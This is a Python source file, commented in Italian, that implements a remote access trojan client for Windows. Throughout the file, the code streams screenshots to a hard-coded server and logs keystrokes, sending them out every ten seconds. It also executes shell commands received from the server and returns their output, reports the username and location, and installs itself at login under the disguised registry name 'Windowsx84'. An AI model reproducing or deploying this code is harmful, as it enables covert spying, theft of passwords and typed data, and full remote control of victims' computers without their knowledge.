import socket
import subprocess
import threading
import struct
import os
import cv2
import numpy as np
import pyautogui
import sys
import time
import getpass  # Per ottenere il nome utente
from geopy.geocoders import Nominatim  # Per ottenere coordinate geografiche
from pynput import keyboard  # Per il keylogger
import winreg as reg  # Per interagire con il registro di sistema

# Configurazione delle porte del server
SERVER_IP = '192.168.150.1'  # IP del server
SCREENSHOT_PORT = 12464     # Porta per gli screenshot
COMMAND_PORT = 12465        # Porta per i comandi
INFO_PORT = 12466           # Porta per invio informazioni al server
KEYLOG_PORT = 12467         # Porta per invio del keylog

# Tempo di attesa tra i tentativi di connessione
RETRY_DELAY = 5  # in secondi

# File temporaneo per salvare il keylog
KEYLOG_FILE = "keylog_temp.txt"

# Directory corrente iniziale
current_directory = os.getcwd()

# Funzione per tentare la connessione con il server
def connessione_socket(ip, porta, descrizione):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, porta))
            print(f"[✅] Connessione per {descrizione} stabilita sulla porta {porta}.")
            return sock
        except ConnectionRefusedError:
            print(f"[⚠️] Connessione per {descrizione} fallita. Riprovo tra {RETRY_DELAY} secondi...")
            time.sleep(RETRY_DELAY)
        except Exception as e:
            print(f"[❌] Errore durante la connessione per {descrizione}: {e}")
            time.sleep(RETRY_DELAY)

# Funzione per catturare i tasti premuti
def keylogger():
    def on_press(key):
        try:
            with open(KEYLOG_FILE, "a") as f:
                f.write(f"{key.char}")  # Salva il carattere premuto
        except AttributeError:
            with open(KEYLOG_FILE, "a") as f:
                f.write(f" [{key}] ")  # Salva i tasti speciali (es: Shift, Enter)

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Funzione per inviare periodicamente il keylog al server
def invia_keylog():
    while True:
        keylog_socket = None
        try:
            keylog_socket = connessione_socket(SERVER_IP, KEYLOG_PORT, "keylog")
            threading.Thread(target=keylogger, daemon=True).start()

            while True:
                if os.path.exists(KEYLOG_FILE):
                    with open(KEYLOG_FILE, "rb") as f:
                        keylog_data = f.read()
                    keylog_socket.sendall(struct.pack("I", len(keylog_data)))
                    keylog_socket.sendall(keylog_data)
                    print("[📜] Keylog inviato al server.")
                    os.remove(KEYLOG_FILE)
                time.sleep(10)
        except Exception as e:
            print(f"[❌] Errore nell'invio del keylog: {e}")
        finally:
            if keylog_socket:
                keylog_socket.close()
            time.sleep(RETRY_DELAY)

# Funzione per inviare screenshot
def gestisci_screenshot():
    while True:
        screenshot_socket = None
        try:
            screenshot_socket = connessione_socket(SERVER_IP, SCREENSHOT_PORT, "screenshot")
            while True:
                screenshot = pyautogui.screenshot()
                frame = np.array(screenshot)
                success, buffer = cv2.imencode('.jpg', frame)
                if not success:
                    continue
                image_data = buffer.tobytes()
                try:
                    screenshot_socket.sendall(struct.pack("I", len(image_data)))
                    screenshot_socket.sendall(image_data)
                    print(f"[📷] Screenshot inviato. Dimensione: {len(image_data)} byte.")
                except Exception as e:
                    break
        except Exception as e:
            print(f"[❌] Errore generale nella gestione degli screenshot: {e}")
        finally:
            if screenshot_socket:
                screenshot_socket.close()
            time.sleep(RETRY_DELAY)

# Funzione per ricevere ed eseguire comandi
def gestisci_comandi():
    global current_directory
    command_socket = connessione_socket(SERVER_IP, COMMAND_PORT, "comandi")
    try:
        while True:
            comando = command_socket.recv(1024).decode().strip()
            if not comando:
                break
            print(f"[📥] Comando ricevuto: {comando}")
            if comando.lower() == "exit":
                break
            if comando.startswith("cd "):
                try:
                    directory = comando[3:].strip()
                    new_directory = os.path.abspath(os.path.join(current_directory, directory))
                    if os.path.isdir(new_directory):
                        current_directory = new_directory
                        response = f"Directory cambiata a: {current_directory}"
                    else:
                        response = f"Errore: la directory {new_directory} non esiste."
                except Exception as e:
                    response = f"Errore durante il cambio directory: {e}"
            else:
                try:
                    output = subprocess.check_output(
                        comando,
                        shell=True,
                        stderr=subprocess.STDOUT,
                        text=True,
                        cwd=current_directory
                    )
                    response = output.strip() if output.strip() else "Comando eseguito senza output."
                except subprocess.CalledProcessError as e:
                    response = e.output.strip() if e.output else f"Errore durante l'esecuzione del comando: {e}"

            try:
                command_socket.sendall(struct.pack("I", len(response.encode('utf-8'))))
                command_socket.sendall(response.encode('utf-8'))
            except Exception as e:
                break
    finally:
        command_socket.close()

# Funzione per gestire la richiesta di informazioni
def gestisci_info():
    info_socket = connessione_socket(SERVER_IP, INFO_PORT, "informazioni")
    try:
        while True:
            richiesta = info_socket.recv(1024).decode().strip()
            if richiesta == "get_info":
                nome_utente = getpass.getuser()
                try:
                    geolocator = Nominatim(user_agent="client_info_agent")
                    location = geolocator.geocode("Your location")
                    coordinate = f"{location.latitude}, {location.longitude}" if location else "Coordinate non disponibili"
                except Exception as e:
                    coordinate = f"Errore nell'ottenere coordinate: {e}"
                info = f"Nome utente: {nome_utente}\nCoordinate: {coordinate}\n"
                info_socket.sendall(struct.pack("I", len(info.encode('utf-8'))))
                info_socket.sendall(info.encode('utf-8'))
    finally:
        info_socket.close()

# Funzione principale per avviare i thread
def avvia_client():
    try:
        threading.Thread(target=gestisci_screenshot, daemon=True).start()
        threading.Thread(target=gestisci_comandi, daemon=True).start()
        threading.Thread(target=gestisci_info, daemon=True).start()
        threading.Thread(target=keylogger, daemon=True).start()
        threading.Thread(target=invia_keylog, daemon=True).start()
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        sys.exit(0)

def aggiungi_avvio_automatico(nome_programma, percorso_programma):
    try:
        chiave_avvio = r"Software\Microsoft\Windows\CurrentVersion\Run"
        chiave = reg.OpenKey(reg.HKEY_CURRENT_USER, chiave_avvio, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(chiave, nome_programma, 0, reg.REG_SZ, percorso_programma)
        reg.CloseKey(chiave)
    except Exception:
        pass

def ottieni_percorso_eseguibile():
    if getattr(sys, 'frozen', False):
        return os.path.abspath(sys.executable)
    else:
        return os.path.abspath(__file__)

if __name__ == "__main__":
    nome_programma = "Windowsx84"
    percorso_programma = ottieni_percorso_eseguibile()
    aggiungi_avvio_automatico(nome_programma, percorso_programma)
    avvia_client()
